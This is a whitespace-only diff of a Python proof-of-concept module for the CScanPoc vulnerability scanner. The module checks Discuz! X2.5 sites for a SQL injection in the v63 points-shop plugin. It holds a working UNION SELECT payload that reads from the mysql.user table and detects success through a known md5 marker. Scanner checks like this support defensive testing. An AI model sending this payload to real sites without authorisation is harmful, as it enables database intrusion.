@@ -3,6 +3,7 @@
 from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 
+
 class Vuln(ABVuln):
     vuln_id = 'Discuz_0031'  # 平台漏洞编号，留空
     name = 'Discuz! v63积分商城插件注入'  # 漏洞名称
@@ -18,6 +19,7 @@ class Vuln(ABVuln):
     product = 'Discuz!'  # 漏洞应用名称
     product_version = ' Discuz X2.5'  # 漏洞应用版本
 
+
 class Poc(ABPoc):
     poc_id = '985fab18-18c3-492e-9d61-e9e789a44717'
     author = '47bwy'  # POC编写者
@@ -31,18 +33,19 @@ class Poc(ABPoc):
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
 
-            payload = "/discuz/plugin.php?id=v63shop:goods&pac=info&gid=@`'` union select @`'`,2,3,4,5,6,7,concat(host,0x3a,md5(c)),9,10,11,12,13,14 from mysql.user" 
-            url = self.target + payload 
-            r = requests.get(url) 
+            payload = "/discuz/plugin.php?id=v63shop:goods&pac=info&gid=@`'` union select @`'`,2,3,4,5,6,7,concat(host,0x3a,md5(c)),9,10,11,12,13,14 from mysql.user"
+            url = self.target + payload
+            r = requests.get(url)
             if '4a8a08f09d37b73795649038408b5f33' in r.text:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞，漏洞地址为{url}'.format(
                     target=self.target, name=self.vuln.name, url=url))
-                
+
         except Exception, e:
             self.output.info('执行异常{}'.format(e))
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
